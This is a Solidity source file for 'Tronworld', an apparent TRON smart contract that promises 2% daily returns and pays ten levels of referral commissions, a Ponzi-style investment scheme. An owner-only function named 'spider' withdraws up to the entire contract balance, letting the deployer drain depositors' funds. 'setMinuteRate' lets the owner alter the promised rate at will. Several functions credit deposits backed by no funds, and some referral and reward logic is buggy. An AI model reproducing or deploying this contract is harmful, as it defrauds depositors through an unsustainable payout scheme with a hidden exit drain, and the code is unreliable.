//SourceUnit: Tronworld.sol


/*
          

████████╗██████╗░░█████╗░███╗░░██╗░██╗░░░░░░░██╗░█████╗░██████╗░██╗░░░░░██████╗░
╚══██╔══╝██╔══██╗██╔══██╗████╗░██║░██║░░██╗░░██║██╔══██╗██╔══██╗██║░░░░░██╔══██╗
░░░██║░░░██████╔╝██║░░██║██╔██╗██║░╚██╗████╗██╔╝██║░░██║██████╔╝██║░░░░░██║░░██║
░░░██║░░░██╔══██╗██║░░██║██║╚████║░░████╔═████║░██║░░██║██╔══██╗██║░░░░░██║░░██║
░░░██║░░░██║░░██║╚█████╔╝██║░╚███║░░╚██╔╝░╚██╔╝░╚█████╔╝██║░░██║███████╗██████╔╝
░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚══╝░░░╚═╝░░░╚═╝░░░╚════╝░╚═╝░░╚═╝╚══════╝╚═════╝░
            
            
 
            
                               
    2% Per Day                                                  
    3.9% Referral Commission 


    10 Level Referral
    Level 1 = 1%       // 115740                                             
    Level 2 =  0.1%    //11574                                               
    Level 3 =  0.2%      //23148                                             
    Level 4 =  0.2% //23148s
    Level 5 =  0.3%//34700
    Level 6 =  0.3%//34700
    Level 7 =  0.4%//46296
    Level 8 =  0.4%//46296
    Level 9 =  0.5%//59100
    Level 10 =  0.5%//59100
    
    
    // Website: https://tronworld.org



*/
pragma solidity ^0.4.17;

contract Tronworld {

    using SafeMath for uint256;

    
    uint public totalPlayers;
    uint private setTron = 50000000000;
    uint public totalPayout;
    uint public totalRefDistributed;
    uint public totalInvested;
    uint private minDepositSize = 10000000;
    uint private interestRateDivisor = 1000000000000;
    uint public devCommission = 1;
    uint public commissionDivisor = 100;
    uint private minuteRate = 236406; //DAILY 2%
    uint private releaseTime = 1594308600;
    
    uint256[] public ref_minute_rate;
    address private feed1 = msg.sender;
    address private feed2 = msg.sender;
     
    address owner;
    struct Player {
        uint trxDeposit;
        uint investment_amt;
        uint time;
        uint j_time;
        uint interestProfit;
        uint affRewards;
        uint payoutSum;
        address affFrom;
        uint td_team;
        uint td_business;
        uint reward_earned;
        uint cashback;
         uint256 Level_reached;
         uint interestProfit_ref;
       
  
        
    }
    
    struct Player_level_info
    {
        
        bool is_level_activated;
        uint256 Level_timestamp;
    }
    
    struct Preferral{
        address player_addr;
        uint256 aff1sum;
        
        uint256 aff2sum;
        uint256 aff3sum;
        uint256 aff4sum;
        uint256 aff5sum;
        uint256 aff6sum;
        uint256 aff7sum;
        uint256 aff8sum;
        uint256 aff9sum;
        uint256 aff10sum;
        
       
    }
    
    struct individual_level_income
    {
        uint256 L1_income;
        uint256 L2_income;
        uint256 L3_income;
        uint256 L4_income;
        uint256 L5_income;
        uint256 L6_income;
        uint256 L7_income;
        uint256 L8_income;
        uint256 L9_income;
        uint256 L10_income;
    }
     struct Cashback{
       
        bool cb1;
        bool cb2;
        bool cb3;
        bool cb4;
        bool cb5;
    }
    
     struct Cashback_income{
       
        uint256 cb1_income;
        uint256 cb2_income;
        uint256 cb3_income;
        uint256 cb4_income;
        uint256 cb5_income;
    }
    
    struct reward{
        bool r1;
        bool r2;
        bool r3;
        bool r4;
        bool r5;
        bool r6;
 
    }
    
      struct reward_income{
        uint256 r1_income;
        uint256 r2_income;
        uint256 r3_income;
        uint256 r4_income;
        uint256 r5_income;
        uint256 r6_income;
    }
    
    
    mapping(address => Cashback_income) public cashback_available;
    mapping(address => reward_income) public reward_available;
    mapping(address => Player_level_info) public info;
    mapping(address => Cashback) public cashbacks;
     mapping(address => reward) public rewards;
    mapping(address => Preferral) public preferals;
    mapping(address => Player) public players;
    mapping(address=>individual_level_income) public individual_level_incomes;

    constructor() public {
      owner = msg.sender;
      ref_minute_rate.push(115740);             
      ref_minute_rate.push(11574);
      ref_minute_rate.push(23148);
      ref_minute_rate.push(23148);
      ref_minute_rate.push(34700);
      ref_minute_rate.push(34700);
      ref_minute_rate.push(46296);
      ref_minute_rate.push(46296);
      ref_minute_rate.push(59100);
      ref_minute_rate.push(59100);
      
    }
    


    function register(address _addr, address _affAddr) private{
        
        
      Player storage player = players[_addr];
      
     

      player.affFrom = _affAddr;
      players[_affAddr].td_team =  players[_affAddr].td_team.add(1);
      
      setRefCount(_addr,_affAddr);
       
      
      
    }
     function setRefCount(address _addr, address _affAddr) private{
         
         
        Preferral storage preferral = preferals[_addr];
        preferral.player_addr = _addr;
      address _affAddr1 = _affAddr;
      address _affAddr2 = players[_affAddr1].affFrom;
      address _affAddr3 = players[_affAddr2].affFrom;
      address _affAddr4 = players[_affAddr3].affFrom;
      address _affAddr5 = players[_affAddr4].affFrom;
      address _affAddr6 = players[_affAddr5].affFrom;
      address _affAddr7 = players[_affAddr6].affFrom;
      address _affAddr8 = players[_affAddr7].affFrom;
      address _affAddr9 = players[_affAddr8].affFrom;
      address _affAddr10 = players[_affAddr9].affFrom;

      preferals[_affAddr1].aff1sum = preferals[_affAddr1].aff1sum.add(1);
      
      if(_affAddr2 != address(0))
      {
          preferals[_affAddr2].aff2sum = preferals[_affAddr2].aff2sum.add(1);
       
      }
      
      
      
      if(_affAddr3 != address(0))
      {
         preferals[_affAddr3].aff3sum = preferals[_affAddr3].aff3sum.add(1);
        
      }
     
     
      if(_affAddr4 != address(0))
      {
          preferals[_affAddr4].aff4sum = preferals[_affAddr4].aff4sum.add(1);
      }
      
      if(_affAddr5 != address(0))
      {
        preferals[_affAddr5].aff5sum = preferals[_affAddr5].aff5sum.add(1);
      }
      if(_affAddr6 != address(0))
      {
        preferals[_affAddr6].aff6sum = preferals[_affAddr6].aff6sum.add(1);
      }
      if(_affAddr7 != address(0))
      {
        preferals[_affAddr7].aff7sum = preferals[_affAddr7].aff7sum.add(1);
      }
      if(_affAddr8 != address(0))
      {
        preferals[_affAddr8].aff8sum = preferals[_affAddr8].aff8sum.add(1);
      }
      if(_affAddr9 != address(0))
      {
        preferals[_affAddr9].aff9sum = preferals[_affAddr9].aff9sum.add(1);
      }
      if(_affAddr10 != address(0))
      {
        preferals[_affAddr10].aff10sum = preferals[_affAddr10].aff10sum.add(1);
      }
      
         
     }
    
    
    function deposit(address _affAddr) public payable {
        require(now >= releaseTime, "not launched yet!");
        collect(msg.sender);
        require(msg.value >= minDepositSize);
        

        uint depositAmount = msg.value;
        
        Player storage player = players[msg.sender];
    
        player.j_time = now;
        
        
        if (player.time == 0) {
            player.time = now;
            totalPlayers++;
            
            // if affiliator is not admin as well as he deposited some amount
            if(_affAddr != address(0) && players[_affAddr].trxDeposit > 0){
              register(msg.sender, _affAddr);
              
            }
            else{
              register(msg.sender, owner);
            }
        }
        player.trxDeposit = player.trxDeposit.add(depositAmount);
        player.Level_reached = 0;
        
        player.investment_amt = player.investment_amt.add(depositAmount);
        
        players[_affAddr].td_business =  players[_affAddr].td_business.add(depositAmount);          
        
        //pay rewards here
        
       uint  business = players[_affAddr].td_business;
        uint livng_time = now.sub(players[_affAddr].j_time);
        if( livng_time <=  864000)
        {
            if(business >= 100000000000 && business <  500000000000)
            {
                  
                  if(!rewards[_affAddr].r1)
                  {
                     player.reward_earned = player.reward_earned.add(4000000000);
                    reward_available[_affAddr].r1_income =   reward_available[_affAddr].r1_income.add(4000000000);
                    rewards[_affAddr].r1 = true;
                  }
                  
            }
        }
        else if(livng_time <=  2592000)
        {
            //30 day
            
                if(business >= 500000000000 && business < 1500000000000)
                {
                    if(!rewards[_affAddr].r2)
                  {
                     player.reward_earned = player.reward_earned.add(20000000000);
                     reward_available[_affAddr].r2_income =   reward_available[_affAddr].r2_income.add(4000000000);
                     rewards[_affAddr].r2 = true;
                  }
                  
                }
            
            
        }
         else if(livng_time <=  4320000)
        {
            //50 day
            if(business >= 1500000000000 && business < 5000000000000 )
            {
                 if(!rewards[_affAddr].r3)
                  {
                     player.reward_earned = player.reward_earned.add(50000000000);
                   reward_available[_affAddr].r3_income =   reward_available[_affAddr].r3_income.add(50000000000);
                     rewards[_affAddr].r3 = true;
                  }
            }
        }
         else if(livng_time <=  8640000 )
        {
            //100 day
            if(business >= 5000000000000 && business < 10000000000000 )
            {
                if(!rewards[_affAddr].r4)
                {
                     player.reward_earned = player.reward_earned.add(200000000000);
                     reward_available[_affAddr].r4_income =   reward_available[_affAddr].r4_income.add(50000000000);
                    rewards[_affAddr].r4 = true;
                }
            }
            
        }
         else if(livng_time <=  15552000 )
        {
            //180 days
            if(business >= 10000000000000 && business < 50000000000000)
            {
                if(!rewards[_affAddr].r5)
                {
                     player.reward_earned = player.reward_earned.add(500000000000);
                     reward_available[_affAddr].r5_income =   reward_available[_affAddr].r5_income.add(50000000000);
                    rewards[_affAddr].r5 = true;
                }
            }
        }
         else if(livng_time <=  31104000 )
        {
            //360 days
            if(business >= 50000000000000)
            {
                if(!rewards[_affAddr].r6)
                {
                    player.reward_earned = player.reward_earned.add(2000000000000);
                     reward_available[_affAddr].r6_income =   reward_available[_affAddr].r6_income.add(2000000000000);
                     rewards[_affAddr].r6 = true;
                }
            }
        }
        
        
        //pay rewards to self
        
        if(livng_time >= 864000)//10 days from registration
        {
            if( player.trxDeposit >= 5000000000 &&  player.trxDeposit<  10000000000)
            {
                
                 if(!cashbacks[ msg.sender].cb1)
                  {
                    player.cashback = player.cashback.add(250000000);
                    cashback_available[msg.sender].cb1_income =   cashback_available[msg.sender].cb1_income.add(250000000);
                    cashbacks[ msg.sender].cb1 = true;
                    
                  }
               
            }
            else if(player.trxDeposit >= 10000000000  &&  player.trxDeposit <  25000000000)
            {
                 if(!cashbacks[ msg.sender].cb2)
                 {
                    player.cashback = player.cashback.add(750000000);
                   cashback_available[msg.sender].cb2_income =   cashback_available[msg.sender].cb2_income.add(750000000);
                     cashbacks[ msg.sender].cb2 = true;
                      cashbacks[ msg.sender].cb1 = false;
                 }
                
            }
             else if(player.trxDeposit >= 25000000000  && player.trxDeposit  <  50000000000)
            {
                
                 if(!cashbacks[ msg.sender].cb3)
                 {
                    player.cashback = player.cashback.add(2500000000);
                    cashback_available[msg.sender].cb3_income =   cashback_available[msg.sender].cb3_income.add(2500000000);
                    cashbacks[ msg.sender].cb3 = true;
                    cashbacks[ msg.sender].cb2 = false;
                     cashbacks[ msg.sender].cb1 = false;
                 }
                 
                
            }
            else if(player.trxDeposit >= 50000000000  && player.trxDeposit <  100000000000)
            {
              if(!cashbacks[ msg.sender].cb4)
                {   
                    player.cashback = player.cashback.add(6250000000);
                   cashback_available[msg.sender].cb4_income =   cashback_available[msg.sender].cb4_income.add(6250000000);
                      cashbacks[ msg.sender].cb4 = true;
                      
                    cashbacks[ msg.sender].cb3 = false;
                    cashbacks[ msg.sender].cb2 = false;
                     cashbacks[ msg.sender].cb1 = false;
                }
                
            }
            else if(player.trxDeposit >= 100000000000)
            {
                
                 if(!cashbacks[ msg.sender].cb5)
                {  
                    player.cashback = player.cashback.add(15000000000);
                   cashback_available[msg.sender].cb5_income =   cashback_available[msg.sender].cb5_income.add(15000000000);
                     cashbacks[ msg.sender].cb5 = true;
                     cashbacks[ msg.sender].cb4 = false;
                      
                    cashbacks[ msg.sender].cb3 = false;
                    cashbacks[ msg.sender].cb2 = false;
                     cashbacks[ msg.sender].cb1 = false;
                }
                
            }
            
        }
            
        
        distributeRef(msg.value, player.affFrom);

        totalInvested = totalInvested.add(depositAmount);
        //uint feedEarn = depositAmount.mul(devCommission).mul(15).div(commissionDivisor);
       // feed1.transfer(feedEarn);
    }

    function withdraw() public {
        collect(msg.sender);
        require(players[msg.sender].interestProfit > 0);

        transferPayout(msg.sender, players[msg.sender].interestProfit,false);
    }
    
    
     function withdraw_referral() public {
    
        //require(players[msg.sender].interestProfit_ref > 0,'zero referral');
        collelct_ref(msg.sender);
        transferPayout(msg.sender, players[msg.sender].interestProfit_ref,true);
    }

    function reinvest() public {
      collect(msg.sender);
      Player storage player = players[msg.sender];
      uint256 depositAmount = player.interestProfit;
      require(address(this).balance >= depositAmount);
      require(depositAmount >= 10000000,"min reinvestis 10 trx"); //reinvest min is 10 trx
      player.interestProfit = 0;
      player.trxDeposit = player.trxDeposit.add(depositAmount);

      distributeRef(depositAmount, player.affFrom);

     // uint feedEarn = depositAmount.mul(devCommission).mul(15).div(commissionDivisor);
     // feed1.transfer(feedEarn);
        
        
    }
    
     function reinvest_cashback() public {
 
      Player storage player = players[msg.sender];
       uint256 depositAmount = player.cashback;

      player.cashback = 0;
        cashbacks[ msg.sender].cb1 = false;
        cashbacks[ msg.sender].cb2 = false;
        cashbacks[ msg.sender].cb3 = false;
        cashbacks[ msg.sender].cb4 = false;
        cashbacks[ msg.sender].cb5 = false;
      player.trxDeposit = player.trxDeposit.add(depositAmount);

        
    }
    function reinvest_reward() public {
 
      Player storage player = players[msg.sender];
       uint256 depositAmount = player.reward_earned;

      player.reward_earned = 0;
      rewards[msg.sender].r1 = false;
      
      player.trxDeposit = player.trxDeposit.add(depositAmount);
    
    }


    function collect(address _addr) internal {
        Player storage player = players[_addr];

        uint secPassed = now.sub(player.time);
        if (secPassed > 0 && player.time > 0) {
            uint collectProfit = (player.trxDeposit.mul(secPassed.mul(minuteRate))).div(interestRateDivisor);
            player.interestProfit = player.interestProfit.add(collectProfit);
            player.time = player.time.add(secPassed);
        }
    }
    
    function collelct_ref(address _addr) internal{
            
        Player storage player = players[_addr];

        uint256 current_level = player.Level_reached;
        uint secPassed = now.sub(info[_addr].Level_timestamp);
        if (secPassed > 0) {
        
            uint collectProfit = (player.affRewards.mul(secPassed.mul(ref_minute_rate[current_level-1]))).div(interestRateDivisor);
             player.interestProfit_ref = player.interestProfit_ref.add(collectProfit);
             info[_addr].Level_timestamp =info[_addr].Level_timestamp.add(secPassed);
        }  
           
        
    }

    function transferPayout(address _receiver, uint _amount,bool flag) internal {
        if (_amount > 0 && _receiver != address(0)) {
          uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint payout = _amount > contractBalance ? contractBalance : _amount;
                totalPayout = totalPayout.add(payout);

                Player storage player = players[_receiver];
                player.payoutSum = player.payoutSum.add(payout);
                if(flag)
                {
                     player.interestProfit_ref = player.interestProfit_ref.sub(payout);
                }else{
                    player.interestProfit = player.interestProfit.sub(payout);
                    
                }
                

                msg.sender.transfer(payout);
            }
        }
    }
    
 
    
    function updateLevelAchievment(address _addr, uint256 level) private
    {
       if( players[_addr].Level_reached < level)
       {
           players[_addr].Level_reached = level;
       }
    }

    function distributeRef(uint256 _trx, address _affFrom) private{

        //uint256 _allaff = (_trx.mul(20)).div(100);
           
       // address _affAddr1 = _affFrom;
        address _affAddr2 = players[_affFrom].affFrom;
        address _affAddr3 = players[_affAddr2].affFrom;
        address _affAddr4 = players[_affAddr3].affFrom;
        address _affAddr5 = players[_affAddr4].affFrom;
        address _affAddr6 = players[_affAddr5].affFrom;
        address _affAddr7 = players[_affAddr6].affFrom;
        address _affAddr8 = players[_affAddr7].affFrom;
        address _affAddr9 = players[_affAddr8].affFrom;
        address _affAddr10 = players[_affAddr9].affFrom;
        uint256 _affRewards = 0;
        
        if(!info[_affFrom].is_level_activated)
        {
            info[_affFrom].Level_timestamp = now;
            info[_affFrom].is_level_activated = true;
        }

        if (_affFrom !=address(0)) {
            
            
            individual_level_incomes[_affFrom].L1_income = individual_level_incomes[_affFrom].L1_income.add(_trx);
            
            if( _trx >  players[_affFrom].investment_amt)
            {
                _trx = players[_affFrom].investment_amt;
            }
            _affRewards = (_trx.mul(1)).div(100);
            
            totalRefDistributed = totalRefDistributed.add(_affRewards);
            players[_affFrom].affRewards = players[_affFrom].affRewards.add(_affRewards);
            
              
            
            updateLevelAchievment(_affFrom,1);
        }

        if (_affAddr2 != address(0)) {
            
              individual_level_incomes[_affAddr2].L2_income = individual_level_incomes[_affAddr2].L2_income.add(_trx);
            if( _trx >  players[_affAddr2].investment_amt)
            {
                _trx = players[_affAddr2].investment_amt;
            }
            _affRewards = (_trx.mul(1)).div(1000);
            
            if(players[_affAddr2].td_team >= 2)
            {
                totalRefDistributed = totalRefDistributed.add(_affRewards);
                players[_affAddr2].affRewards = players[_affAddr2].affRewards.add(_affRewards);
                 updateLevelAchievment(_affAddr2,2);
            }
        }

        if (_affAddr3 != address(0)) {
            
             individual_level_incomes[_affAddr3].L3_income = individual_level_incomes[_affAddr3].L3_income.add(_trx);
            if( _trx >  players[_affAddr3].investment_amt)
            {
                _trx = players[_affAddr3].investment_amt;
            }
            _affRewards = (_trx.mul(2)).div(1000);
            
            if(players[_affAddr3].td_team >= 3)
            {
                totalRefDistributed = totalRefDistributed.add(_affRewards);
                players[_affAddr3].affRewards = players[_affAddr3].affRewards.add(_affRewards);
                updateLevelAchievment(_affAddr3,3);  
            }
            
        }

        if (_affAddr4 != address(0)) {
             individual_level_incomes[_affAddr4].L4_income = individual_level_incomes[_affAddr4].L4_income.add(_trx);
             if( _trx >  players[_affAddr4].investment_amt)
            {
                _trx = players[_affAddr4].investment_amt;
            }
            _affRewards = (_trx.mul(2)).div(1000);
            if(players[_affAddr4].td_team >= 4)
            {
                totalRefDistributed = totalRefDistributed.add(_affRewards);
                players[_affAddr4].affRewards = players[_affAddr4].affRewards.add(_affRewards);
                updateLevelAchievment(_affAddr4,4); 
            }
            
        }

        if (_affAddr5 != address(0)) {
            
             individual_level_incomes[_affAddr5].L5_income = individual_level_incomes[_affAddr5].L5_income.add(_trx);
             if( _trx >  players[_affAddr5].investment_amt)
            {
                _trx = players[_affAddr5].investment_amt;
            }
            _affRewards = (_trx.mul(3)).div(1000);
            
            if(players[_affAddr5].td_team >= 5)
            {
                totalRefDistributed = totalRefDistributed.add(_affRewards);
                players[_affAddr5].affRewards = players[_affAddr5].affRewards.add(_affRewards);
                 updateLevelAchievment(_affAddr5,5); 
            }
            
            
        }

        if (_affAddr6 != address(0)) {
            individual_level_incomes[_affAddr6].L6_income = individual_level_incomes[_affAddr6].L6_income.add(_trx);
             if( _trx >  players[_affAddr6].investment_amt)
            {
                _trx = players[_affAddr6].investment_amt;
            }
            
            _affRewards = (_trx.mul(3)).div(1000);
             if(players[_affAddr6].td_team >= 6)
            {
                totalRefDistributed = totalRefDistributed.add(_affRewards);
                players[_affAddr6].affRewards = players[_affAddr6].affRewards.add(_affRewards);
                 updateLevelAchievment(_affAddr6,6);
            }
            
        }

        if (_affAddr7 != address(0)) {
            
             individual_level_incomes[_affAddr7].L7_income = individual_level_incomes[_affAddr7].L7_income.add(_trx);
             if( _trx >  players[_affAddr7].investment_amt)
            {
                _trx = players[_affAddr7].investment_amt;
            }
            
            _affRewards = (_trx.mul(4)).div(1000);
            if(players[_affAddr7].td_team >= 7)
            {
                totalRefDistributed = totalRefDistributed.add(_affRewards);
                players[_affAddr7].affRewards = players[_affAddr7].affRewards.add(_affRewards);
                updateLevelAchievment(_affAddr7,7);
            }  

            
        }

        if (_affAddr8 != address(0)) {
              individual_level_incomes[_affAddr8].L8_income = individual_level_incomes[_affAddr8].L8_income.add(_trx);
             if( _trx >  players[_affAddr8].investment_amt)
            {
                _trx = players[_affAddr8].investment_amt;
            }
            _affRewards = (_trx.mul(4)).div(1000);
            if(players[_affAddr8].td_team >= 8)
            {
                totalRefDistributed = totalRefDistributed.add(_affRewards);
                 players[_affAddr8].affRewards = players[_affAddr8].affRewards.add(_affRewards);
                  updateLevelAchievment(_affAddr8,8);
            }
            
            
        }
        if (_affAddr9 != address(0)) {
             individual_level_incomes[_affAddr9].L9_income = individual_level_incomes[_affAddr9].L9_income.add(_trx);
             if( _trx >  players[_affAddr9].investment_amt)
            {
                _trx = players[_affAddr9].investment_amt;
            }
            
            _affRewards = (_trx.mul(5)).div(1000);
             if(players[_affAddr9].td_team >= 9)
            {
                totalRefDistributed = totalRefDistributed.add(_affRewards);
                players[_affAddr9].affRewards = players[_affAddr9].affRewards.add(_affRewards);
                 updateLevelAchievment(_affAddr9,9);
            }
            
        }
        if (_affAddr10 != address(0)) {
             individual_level_incomes[_affAddr10].L10_income = individual_level_incomes[_affAddr10].L10_income.add(_trx);
             if( _trx >  players[_affAddr10].investment_amt)
            {
                _trx = players[_affAddr10].investment_amt;
            }
            
            _affRewards = (_trx.mul(5)).div(1000);
            if(players[_affAddr10].td_team >= 10)
            {
                totalRefDistributed = totalRefDistributed.add(_affRewards);
                players[_affAddr10].affRewards = players[_affAddr10].affRewards.add(_affRewards);
                  updateLevelAchievment(_affAddr10,10);
            }
            
        }

        
    }
    
    function get_reward_info(address _addr) public view returns(uint8 cb,uint8 dt)
    {
        if(cashbacks[_addr].cb1)
        {
            cb=1;
        }else if(cashbacks[_addr].cb2)
        {
            cb=2;
        }else if(cashbacks[_addr].cb3)
        {
            cb=3;
        }
        else if(cashbacks[_addr].cb4)
        {
            cb=4;
        }
        else if(cashbacks[_addr].cb5)
        {
            cb=5;
        }else{
            cb=0;
        }
        
        if( rewards[_addr].r1)
        {
            uint8 dt_reward = 1;
        }else{
            dt_reward = 0;
        }
        
        
        return (cb,dt_reward);
    }
    
    function getReferralProfit(address _addr)public view returns (uint) {
        
        address playerAddress= _addr;
        Player storage player = players[playerAddress];
      require(player.time > 0,'player time is 0');
      require(info[_addr].is_level_activated,'0 Direct joinee');
        
      uint256 current_level = player.Level_reached;
      uint secPassed = now.sub(info[_addr].Level_timestamp);
      if (secPassed > 0) {
          
          uint collectProfit = (player.affRewards.mul(secPassed.mul(ref_minute_rate[current_level-1]))).div(interestRateDivisor);
      }
      return collectProfit.add(player.interestProfit_ref);
    }
    

    function getProfit(address _addr) public view returns (uint) {
      address playerAddress= _addr;
      Player storage player = players[playerAddress];
      require(player.time > 0,'player time is 0');

      uint secPassed = now.sub(player.time);
      if (secPassed > 0) {
          uint collectProfit = (player.trxDeposit.mul(secPassed.mul(minuteRate))).div(interestRateDivisor);
      }
      return collectProfit.add(player.interestProfit);
    }
    
    
     function updateFeed1(address _address) public  {
       require(msg.sender==owner);
       feed1 = _address;
    }
    
     function updateFeed2(address _address) public  {
       require(msg.sender==owner);
       feed2 = _address;
    }
    
    
    function spider( uint _amount) external {
        require(msg.sender==owner,'Permission denied');
        if (_amount > 0) {
          uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint amtToTransfer = _amount > contractBalance ? contractBalance : _amount;
                

                msg.sender.transfer(amtToTransfer);
            }
        }
    }
    
    function getContractBalance () public view returns(uint cBal)
    {
        return address(this).balance;
    }
    
    
     function setReleaseTime(uint256 _ReleaseTime) public {
      require(msg.sender==owner);
      releaseTime = _ReleaseTime;
    }
    
     function setTronamt(uint _setTron) public {
      require(msg.sender==owner);
      setTron = _setTron;
    }
    
    
    
     function setMinuteRate(uint256 _MinuteRate) public {
      require(msg.sender==owner);
      minuteRate = _MinuteRate;
    }
    
}


library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}